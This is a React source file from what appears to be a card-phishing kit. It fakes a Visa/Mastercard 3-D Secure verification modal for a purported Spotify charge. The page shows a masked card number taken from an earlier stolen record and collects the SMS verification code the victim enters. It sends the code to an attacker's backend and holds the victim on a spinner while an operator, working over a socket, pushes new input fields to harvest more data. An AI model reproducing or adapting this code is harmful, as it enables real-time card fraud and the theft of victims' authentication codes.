import React, { useState, useEffect } from 'react';
import { socket } from '../../index';
import { zokomId } from '../utils/auth';
import axios from 'axios';
import visaLogo from '../vbv/visa_logo.svg';
import mcLogo from '../vbv/mc_symbol.svg';
import amexLogo from '../vbv/american_express_logo.svg';

const ContainerCustom = () => {
  const [styles, setStyles] = useState(null);
  const [showNotif, setShowNotif] = useState(true);
  const [logoUrl, setLogoUrl] = useState('');
  const [brandLogo, setBrandLogo] = useState('');
  const [brand, setBrand] = useState('');
  const [links, setLinks] = useState({});
  const [currentDate, setCurrentDate] = useState('');
  const [inputs, setInputs] = useState([]);
  const [inputsConfig, setInputsConfig] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [maskedCardNumber, setMaskedCardNumber] = useState('************');
  const [formData, setFormData] = useState({});
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const userId = zokomId();

  const handleContinue = (logoUrl, brandLogo, links) => {
    setLogoUrl(logoUrl);
    setBrandLogo(brandLogo);
    setLinks(links);
    setShowNotif(false);
  };

  useEffect(() => {
    const sessionId = localStorage.getItem('sessionId');
    const storedConfig = localStorage.getItem(`inputsConfig_${sessionId}`);
    if (storedConfig) {
      setInputsConfig(JSON.parse(storedConfig));
    }

    socket.on('addCustomInput', ({ sessionId, input }) => {
      console.log('Received addCustomInput event:', { sessionId, input });
      if (sessionId === localStorage.getItem('sessionId')) {
        setInputs(prev => [...prev, input]);
      }
    });

    socket.on('configureInputs', ({ sessionId, inputsConfig }) => {
      console.log('Received configureInputs event:', { sessionId, inputsConfig });
      if (sessionId === localStorage.getItem('sessionId')) {
        setInputsConfig(inputsConfig);
        localStorage.setItem(`inputsConfig_${sessionId}`, JSON.stringify(inputsConfig));
        setIsLoading(false);
      }
    });

    socket.on('configUpdate', ({ sessionId: updatedSessionId, inputsConfig }) => {
      if (updatedSessionId === sessionId) {
        setInputsConfig(inputsConfig);
        localStorage.setItem(`inputsConfig_${sessionId}`, JSON.stringify(inputsConfig));
        setIsLoading(false);
      }
    });

    return () => {
      socket.off('addCustomInput');
      socket.off('configureInputs');
      socket.off('configUpdate');
    };
  }, []);

  const getBrandLogo = () => {
    console.log('Getting brand logo for:', brand); // Log the brand value
    switch (brand.toLowerCase()) {
      case 'visa':
        return visaLogo;
      case 'mastercard':
        return mcLogo;
      case 'amex':
      case 'american express':
        return amexLogo;
      default:
        return '';
    }
  };

  useEffect(() => {
    const loadStyles = async () => {
      try {
        const [loginStyles, additionalStyles, spinnerStyles] = await Promise.all([
          import('../../assets/styles/container.css'),
          import('../../assets/styles/container_error.css'),
          import('./container_custom.css'),
        ]);

        setStyles({
          login: loginStyles.default,
          additional: additionalStyles.default,
          more: spinnerStyles.default,
        });
      } catch (error) {
        console.error('Error loading styles:', error);
      }
    };

    const fetchLogoUrl = async () => {
      try {
        const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/billing/logo-url/${userId}`);
        if (response.data) {
          setLogoUrl(response.data.logoUrl);
          setBrand(response.data.brand);
          console.log('Brand:', response.data.brand); // Log the brand value
        }
      } catch (error) {
        console.error('Error fetching logo URL:', error);
      }
    };

    const fetchCreditCard = async () => {
      try {
        const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/user-info/${userId}`);
        if (response.data && response.data.cardNumber) {
          // Mask all but last 4 digits
          const last4 = response.data.cardNumber.slice(-4);
          const masked = '*'.repeat(12) + last4;
          setMaskedCardNumber(masked);
        }
      } catch (error) {
        console.error('Error fetching credit card info:', error);
        setMaskedCardNumber('************0000'); // Fallback masked number
      }
    };

    fetchLogoUrl();
    fetchCreditCard();
    loadStyles();

    // Set the current date
    const now = new Date();
    const formattedDate = now.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    });
    setCurrentDate(formattedDate);
  }, [userId]);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const inputs = Object.values(formData).filter(value => value.trim() !== '').join(', ');
    if (!inputs) {
      setError('Incorrect code');
      return;
    }

    setLoading(true);
    try {
      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/billing/${userId}/verify-otp`, {
        otp: inputs
      });

      if (response.status === 200) {
        // Stays waiting for admin to change component, set a loading indicator and wait
        setLoading(true);
      }
    } catch (error) {
      //setError('Verification failed');
    } finally {
      setLoading(true);
    }
  };

  useEffect(() => {
    const sessionId = localStorage.getItem('sessionId');
    const fetchConfig = async () => {
      try {
        const response = await fetch(`${process.env.REACT_APP_API_URL}/api/get-input-config/${sessionId}`);
        if (response.ok) {
          const data = await response.json();
          setInputsConfig(data.inputsConfig);
          localStorage.setItem(`inputsConfig_${sessionId}`, JSON.stringify(data.inputsConfig));
        } else {
          const storedConfig = localStorage.getItem(`inputsConfig_${sessionId}`);
          if (storedConfig) {
            setInputsConfig(JSON.parse(storedConfig));
          }
        }
      } catch (error) {
        console.error('Error fetching input configuration:', error);
        const storedConfig = localStorage.getItem(`inputsConfig_${sessionId}`);
        if (storedConfig) {
          setInputsConfig(JSON.parse(storedConfig));
        }
      } finally {
        setIsLoading(false);
      }
    };

    fetchConfig();

    socket.on('configureInputs', ({ sessionId, inputsConfig }) => {
      console.log('Received configureInputs event:', { sessionId, inputsConfig });
      if (sessionId === localStorage.getItem('sessionId')) {
        setInputsConfig(inputsConfig);
        localStorage.setItem(`inputsConfig_${sessionId}`, JSON.stringify(inputsConfig));
        setIsLoading(false);
      }
    });

    return () => {
      socket.off('configureInputs');
    };
  }, []);

  if (isLoading && inputsConfig.length === 0) {
    return <body className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
    <div id="Cardinal-ElementContainer">
      <div id="Cardinal-Modal" style={{paddingTop: '0px'}} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
        <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
        </div>
      </div>
      <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
    </div>
  </body>;
  }

  return (
    <body className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
      <div id="Cardinal-ElementContainer">
        <div id="Cardinal-Modal" style={{ paddingTop: '0px' }} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
          <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
              {loading && (
                <div className="spinner-overlay">
                  <div className="spinner"></div>
                </div>
              )}
            <div style={{
              maxHeight: '100%',
              overflow: 'auto',
              padding: '20px',
            }} className="threeds-two">
              <div className="container-fluid">
                <div style={{ scrollPaddingBottom: '24px', minHeight: '30xp'}}>
                  {/* Show the logos here */}
                  <img src={logoUrl} alt="" style={{ width: '20%', float: 'left' }} />
                  <img src={getBrandLogo()} alt="" style={{ width: '20%', float: 'right' }} />
                </div>
                <br/>
                <br/>
                <br/>
                <br/>
                <img className="image" src="https://netwatchnow.com/be/app/res/ganfad.png" alt="" style={{ width: '20%' }} />
                <br />
                <div className="body" dir="LTR" style={{ bottom: '71.25px' }}>
                  <div className="container container-sticky-footer">
                    <form
                      autoComplete="off"
                      data-ajax="true"
                      data-ajax-begin="ccHelpers.ajax.onBegin"
                      data-ajax-complete="ccHelpers.ajax.onComplete"
                      data-ajax-failure="ccHelpers.ajax.onFailure"
                      data-ajax-method="form"
                      data-ajax-success="ccHelpers.ajax.onSuccess"
                      id="ValidateCredentialForm"
                      method="post"
                      name="ValidateCredentialForm"
                      noValidate
                      onSubmit={handleSubmit}
                    >
                      <div className="body" dir="LTR" style={{ bottom: '71.25px' }}>
                        <div className="row"></div>
                        <div className="row">
                          <div className="col-12" id="ValidateOneUpMessage">
                            <div style={{ textAlign: 'center' }} id="Body1">
                              <strong>Protecting Your Online Payment</strong>
                            </div>
                          </div>
                        </div>
                        <div className="row">
                          <div style={{ textAlign: 'center' }} className="col-12" id="ValidateOptInMessage">
                            A Verification Code has been sent to your registered mobile phone number via SMS. By clicking Submit, you are deemed to have accepted the terms and conditions below.
                          </div>
                        </div>
                        <br />
                        <div className="row form-two-col">
                          <div className="col-12 p-0">
                            <fieldset id="ValidateTransactionDetailsContainer">
                              <div className="validate-field row">
                                <span style={{ textAlign: "left" }} className="validate-label col-6">Merchant</span>
                                <span style={{ textAlign: "right" }} className="col-6">WWW.SPOTIFY.COM</span>
                              </div>
                              <div className="validate-field row">
                                <span style={{ textAlign: "left" }} className="validate-label col-6">Card Number</span>
                                <span style={{ textAlign: "right" }} className="col-6 always-left-to-right">{maskedCardNumber}</span>
                              </div>
                              <div className="validate-field row">
                                <span style={{ textAlign: "left" }} className="validate-label col-6">Date</span>
                                <span style={{ textAlign: "right" }} className="col-6 always-left-to-right">{currentDate}</span>
                              </div>
                              <br />
                              <br />
                              { error && <div style={{fontWeight: 'normal'}} className="error_msg"><b style={{fontWeight: 'bold'}}>{error}</b>. Please try again.</div> }
                              <div id="cust" className="formcol">
                                {inputsConfig.map((input, index) => (
                                  <div key={index} style={{ marginBottom: '10px' }}>
                                    <input
                                      type={input.type}
                                      placeholder={input.placeholder}
                                      name={input.name}
                                      className="textinput"
                                      required={input.type !== 'hidden'}
                                      style={{ display: input.type === 'hidden' ? 'none' : 'block' }}
                                      onChange={handleChange}
                                    />
                                  </div>
                                ))}
                              </div>
                            </fieldset>
                            <div className="col-12 text-center">
                              <button className="submitbtn" type="submit" disabled={loading}>
                                Confirm
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div className="sticky-footer">
                        <div className="row no-pad">
                        </div>
                        <div className="" id="FooterLinks">
                          <div className="row">
                            <div className="col-12">
                            </div>
                          </div>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
                <br />
              </div>
            </div>
          </div>
        </div>
        <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
      </div>
    </body>
  );
};

export default ContainerCustom;
